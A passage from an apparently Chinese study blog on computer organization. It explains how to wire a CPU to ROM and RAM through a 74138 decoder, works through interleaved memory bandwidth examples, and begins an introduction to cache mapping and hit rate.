/><p>由74138译码器输入逻辑关系可知,必须保证控制端<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>G</mi><mn>1</mn></msub><mo separator="true">,</mo><mover accent="true"><msub><mi>G</mi><mrow><mn>2</mn><mi>A</mi></mrow></msub><mo stretchy="true">‾</mo></mover><mo separator="true">,</mo><mover accent="true"><msub><mi>G</mi><mrow><mn>2</mn><mi>B</mi></mrow></msub><mo stretchy="true">‾</mo></mover></mrow><annotation encoding="application/x-tex">G_1,\overline{G_{2A}},\overline{G_{2B}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0777700000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord overline"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathnormal mtight">A</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord overline"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span>第一个接口为高电平，后两个接口为低电平，才能使译码器正常工作。根据第一步写出的存储器地址范围得出，A<sub>15</sub>始终为低电平，A<sub>14</sub>始终为高电平,它们正好可分别与译码器的G低，G高对应。而访存控制信号 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mrow><mi>M</mi><mi>R</mi><mi>E</mi><mi>O</mi></mrow><mo stretchy="true">‾</mo></mover></mrow><annotation encoding="application/x-tex">\overline{MREO}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8833300000000001em;vertical-align:0em;"></span><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span></span></span></span>（低电平有效）又正好可与G（低）对应。故分配两个低电平信号连接低电平有效的接口，高电平信号连接高电平有效的接口。</p><p>剩下的A<sub>13</sub>、A<sub>12</sub>、A<sub>11</sub>可分别接到译码器的C、B、A输入端。其输出<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><msub><mi>Y</mi><mn>4</mn></msub><mo stretchy="true">‾</mo></mover></mrow><annotation encoding="application/x-tex">\overline{Y_4}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.03333em;vertical-align:-0.15em;"></span><span class="mord overline"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span>有效时，选中1片ROM；<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><msub><mi>Y</mi><mn>5</mn></msub><mo stretchy="true">‾</mo></mover></mrow><annotation encoding="application/x-tex">\overline{Y_5}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.03333em;vertical-align:-0.15em;"></span><span class="mord overline"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span>与A<sub>10</sub>同时有效均为低电平时，与门输出选2片RAM。这里之所以没有把<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><msub><mi>Y</mi><mn>5</mn></msub><mo stretchy="true">‾</mo></mover></mrow><annotation encoding="application/x-tex">\overline{Y_5}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.03333em;vertical-align:-0.15em;"></span><span class="mord overline"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span>和RAM单独连接是因为，当出现<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><msub><mi>Y</mi><mn>5</mn></msub><mo stretchy="true">‾</mo></mover></mrow><annotation encoding="application/x-tex">\overline{Y_5}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.03333em;vertical-align:-0.15em;"></span><span class="mord overline"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span>和A<sub>10</sub>高电平时，此时表示的范围超出了题给范围，不应该继续选择RAM，所以必须限定A<sub>10</sub>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><msub><mi>Y</mi><mn>5</mn></msub><mo stretchy="true">‾</mo></mover></mrow><annotation encoding="application/x-tex">\overline{Y_5}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.03333em;vertical-align:-0.15em;"></span><span class="mord overline"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span>同时为低电平才可以。</p><p>图中ROM 芯片的PD/progr端接地，以确保在读出时低电平有效（因为需要始终确保系统运行，所以直接用接地低电平信号启动ROM）。RAM芯片的读写控制端与CPU的读写命令端<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mrow><mi>W</mi><mi>R</mi></mrow><mo stretchy="true">‾</mo></mover></mrow><annotation encoding="application/x-tex">\overline{WR}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8833300000000001em;vertical-align:0em;"></span><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span></span></span></span>相连。ROM的8根数据线直接与CPU的8根数据线相连,2片RAM的数据线分别与CPU数据总线的高4位和低4位相连。</p><p>小小总结一下，比起存储器的扩展，连接CPU和存储器多了CPU和译码器两个要素，归纳一下要点如下：</p><ul><li>先画出CPU，译码器。将访存信号、译码器控制端连接好。</li><li>从下至上依次画出数据线和地址线。</li><li>画出ROM和RAM，注意如果需要扩展存储器使用的是位扩展还是字扩展，并连接好数据线、地址线、写入信号和PD接地信号。</li><li>将译码器的端口输出和门电路组合成片选信号，原理类似于字扩展，但是这里用来选择系统存储器和用户存储器。</li><li>将片选信号连接至存储器</li></ul><h5 id="例题二"><a class="markdownIt-Anchor" href="#例题二"></a> 例题二</h5><blockquote><p>假设同前，要求最小 8K为系统程序区，相邻 16K为用户程序区，接着又有最大4K为系统程序工作区</p></blockquote><p>同样按照四步走：写出地址二进制码、确定芯片数量和类型、分配地址线、确定片选信号。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240617144922150.png" alt="image-20240617144922150" style="zoom:50%;" /><p>过程不再给出证明。不过这里请留意，RAM选用了两片8K×8位的芯片组成了16K×8位的用户存储器，这里是字扩展。并且第三块区域是“系统工作区”而非系统存储区，所以选用RAM而非ROM。</p><p>接着分配地址线并确定片选信号：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240617145120310.png" alt="image-20240617145120310" style="zoom:50%;" /><p>这里地址线最大的是8K的存储器，故一共使用了2<sup>3</sup>×2<sup>10</sup>=2<sup>13</sup>共13根地址线，剩下3根地址线用作译码器的功能端。可以看到，当<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi>Y</mi><mo stretchy="true">‾</mo></mover></mrow><annotation encoding="application/x-tex">\overline{Y}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8833300000000001em;vertical-align:0em;"></span><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span></span></span></span>端口：</p><ul><li>输出为0时，CPU选择第一块系统存储器ROM；</li><li>当输出为1、2时，CPU选择用户存储器RAM；1和2又分别对应16K×8位RAM中使用了字扩展的两块8K×8位RAM。</li><li>当输出为7时，CPU选择第二块系统工作区存储器RAM。</li></ul><p>最后，画图如下：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240617145539789.png" alt="image-20240617145539789" style="zoom:50%;" /><p>同理，这里之所以要把A<sub>12</sub>的信号与一个非门连接最后和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><msub><mi>Y</mi><mn>7</mn></msub><mo stretchy="true">‾</mo></mover></mrow><annotation encoding="application/x-tex">\overline{Y_7}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.03333em;vertical-align:-0.15em;"></span><span class="mord overline"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span>做与非运算，就是为了确保选择系统工作区RAM的唯一性。</p><p>至此关于CPU和存储器连接的重难点就讲解完毕了，相信大家都能够画出正确的图。最后再强调一遍画图总结：</p><ul><li>先画出CPU，译码器。将访存信号、译码器控制端连接好。</li><li>从下至上依次画出数据线和地址线。</li><li>画出ROM和RAM，注意如果需要扩展存储器使用的是位扩展还是字扩展，并连接好数据线、地址线、写入信号和PD接地信号。</li><li>将译码器的端口输出和门电路组合成片选信号，原理类似于字扩展，但是这里用来选择系统存储器和用户存储器。</li><li>将片选信号连接至存储器</li></ul><h3 id="提高访存速度的措施"><a class="markdownIt-Anchor" href="#提高访存速度的措施"></a> 提高访存速度的措施</h3><p>计算机不断发展，访问主存的速度成为计算机发展的掣肘。为了提高访存效率，先前我们已经介绍过两种方法，即：采用高速器件和层次结构。要么是提升硬件的属性，要么是在层次结构中使用Cache让快速器件更快的访问数据而避免耗时长的内存索引。</p><p>但是Cache的造价昂贵，所以不能普遍推广到计算机整体，而只能把钱花在刀刃上。所以，我们还可以通过第三种方法，即<strong>调整主存结构</strong>。主存结构有两种：单体多字系统和多体并行系统。掌握概念就好。</p><h4 id="单体多字系统"><a class="markdownIt-Anchor" href="#单体多字系统"></a> 单体多字系统</h4><p>结构图如下：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240617153022511.png" alt="image-20240617153022511" style="zoom:50%;" /><p>原理很简单：假设指令在内存中时连续存取的，那么地址寄存器只需要储存第一条指令的地址，设位数为w。当主存控制器取指令时，就直接按地址在一个存储周期内读出4×w位数据，能使主存的带宽提高4倍。但是当遇到转移指令或者操作数不连续存放时，这种效果就不明显。</p><h4 id="多体并行系统"><a class="markdownIt-Anchor" href="#多体并行系统"></a> 多体并行系统</h4><p>多体的特点在于一个体正在与CPU交换信息时，其他体可以与外设交互，实现多个体并行工作，加快了访存效率。</p><p>多体并行系统分为<strong>高位交叉编址顺序存放</strong>和<strong>低位交叉编址交叉存放</strong>。前者高位存储体号，低位存储体内地址；后者反之。结构图分别如下：</p><p>高位交叉：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240617154154913.png" alt="image-20240617154154913" style="zoom:50%;" /><p>低位交叉：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240617154229272.png" alt="image-20240617154229272" style="zoom:50%;" /><p>低位交叉能在不改变存取周期的前提下，增加存储器的带宽。因为高位交叉的信息是按顺序存储在一个体内，导致该模块成为瓶颈；而低位交叉存储则可以通过并行的方式读取来加快效率。</p><blockquote><p>例题：设4个模块组成的四体存储器结构，每个体的存储字长为32位，存取周期200ns，数据总线宽度32位，总线传输周期为50ns，求顺序存储和交叉存储的存储器带宽。</p><ol><li><p>顺序存储：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>不增加带宽</mtext></mrow><annotation encoding="application/x-tex">不增加带宽</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">增</span><span class="mord cjk_fallback">加</span><span class="mord cjk_fallback">带</span><span class="mord cjk_fallback">宽</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>读出一个字的时间为</mtext><mn>200</mn><mi>n</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">读出一个字的时间为200ns</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">读</span><span class="mord cjk_fallback">出</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">字</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">间</span><span class="mord cjk_fallback">为</span><span class="mord">2</span><span class="mord">0</span><span class="mord">0</span><span class="mord mathnormal">n</span><span class="mord mathnormal">s</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>带宽为：</mtext><mn>32</mn><mi mathvariant="normal">/</mi><mn>200</mn><mi>n</mi><mi>s</mi><mo>=</mo><mn>16</mn><mo>×</mo><mn>1</mn><msup><mn>0</mn><mn>7</mn></msup><mi>b</mi><mi>p</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">带宽为：32/200ns=16×10^7bps</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">带</span><span class="mord cjk_fallback">宽</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">：</span><span class="mord">3</span><span class="mord">2</span><span class="mord">/</span><span class="mord">2</span><span class="mord">0</span><span class="mord">0</span><span class="mord mathnormal">n</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord">6</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span></span></span></span></span><span class="mord mathnormal">b</span><span class="mord mathnormal">p</span><span class="mord mathnormal">s</span></span></span></span></p></li><li><p>交叉存储：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>读出</mtext><mn>4</mn><mtext>个字的时间为</mtext><mn>200</mn><mi>n</mi><mi>s</mi><mo>+</mo><mn>50</mn><mi>n</mi><mi>s</mi><mo>×</mo><mo stretchy="false">(</mo><mn>4</mn><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>=</mo><mn>350</mn><mi>n</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">读出4个字的时间为200ns+50ns×(4-1)=350ns</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord cjk_fallback">读</span><span class="mord cjk_fallback">出</span><span class="mord">4</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">字</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">间</span><span class="mord cjk_fallback">为</span><span class="mord">2</span><span class="mord">0</span><span class="mord">0</span><span class="mord mathnormal">n</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">5</span><span class="mord">0</span><span class="mord mathnormal">n</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mord">5</span><span class="mord">0</span><span class="mord mathnormal">n</span><span class="mord mathnormal">s</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>带宽为</mtext><mo>:</mo><mo stretchy="false">(</mo><mn>32</mn><mo>×</mo><mn>4</mn><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mn>350</mn><mi>n</mi><mi>s</mi><mo>=</mo><mn>37</mn><mo>×</mo><mn>1</mn><msup><mn>0</mn><mn>7</mn></msup><mi>b</mi><mi>p</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">带宽为:(32×4)/350ns=37×10^7bps</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">带</span><span class="mord cjk_fallback">宽</span><span class="mord cjk_fallback">为</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">3</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">4</span><span class="mclose">)</span><span class="mord">/</span><span class="mord">3</span><span class="mord">5</span><span class="mord">0</span><span class="mord mathnormal">n</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">3</span><span class="mord">7</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span></span></span></span></span><span class="mord mathnormal">b</span><span class="mord mathnormal">p</span><span class="mord mathnormal">s</span></span></span></span></p></li></ol></blockquote><p>我们在 DRAM 的芯片内 集成 了一个由 SRAM 组成的 Cache ，有利于 猝发式读取 ，这就体现了计算机的层次结构运用。可见很多时候提高访存速度的手段是结合起来运用的。</p><h3 id="高速缓冲存储器cache"><a class="markdownIt-Anchor" href="#高速缓冲存储器cache"></a> 高速缓冲存储器Cache</h3><p>我们之前提到了，可以用单体或者多体来一次性将多条指令或数据读入高速缓存Cache或者是通过并行工作从主存中将数据读入Cache再送入CPU中。</p><p>但是，这么做还是不够快。研究发现：最近被访问的信息和临近的信息很可能还要被访问。比如我们在程序中调用多个函数或者过程。此时，如果每次都去从主存中读取数据到Cache中会浪费时间。所以，我们选择<strong>一次性将最近被访问的信息项临近的信息一起装入到Cache中</strong>。这样就可以避免CPU在原地空等Cache去从主存中读取信息了，提高了计算机访存效率。</p><p>我们在在这一节主要介绍Cache编码、命中率的计算以及映射方式、利用率的概念。<strong>非常</strong>重要，要求掌握。</p><h4 id="cache的工作原理"><a class="markdownIt-Anchor" href="#cache的工作原理"></a> Cache的工作原理</h4><p>参考下图：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240617160906983.png" alt="image-20240617160906983" style="zoom:50%;" /><p>我们把主存地址划分为两部分：假设一个字n位，前m位储存主存块号，后b位字储存块内地址。这样就把主存按块划分，共有M=2<sup>m</sup>块；同理，将Cache的地址也划分为两部分，其中c位存储缓存块号，b位存储块内地址，C=2<sup>c</sup>反映了缓存块的数量，2<sup>b</sup>代表了块的大小，其中M&gt;&gt;C。通过这样做就建立起了Cache和主存间的映射关系，主存块号用标记记录与某缓存块建立了对应关系。</p><h4 id="命中与未命中"><a class="markdownIt-Anchor" href="#命中与未命中"></a> 命中与未命中</h4><p>在建立对应关系后，CPU欲读取主存某字有两种结果：主存已在Cache中，那么就直接从Cache中读取一个字，在较高层次的存储器中发现要访问的内容成为<strong>Cache命中</strong>；如果主存不在Cache中，那么就从主存中将整个字块一起调入Cache，再传入CPU，称为<strong>Cache未命中</strong>。</p><h4 id="cache-的命中率"><a class="markdownIt-Anchor" href="#cache-的命中率"></a> Cache 的命中率</h4><p>Cache 的命中率是CPU欲访问的信息在Cache 中的比率，命中率与 Cache 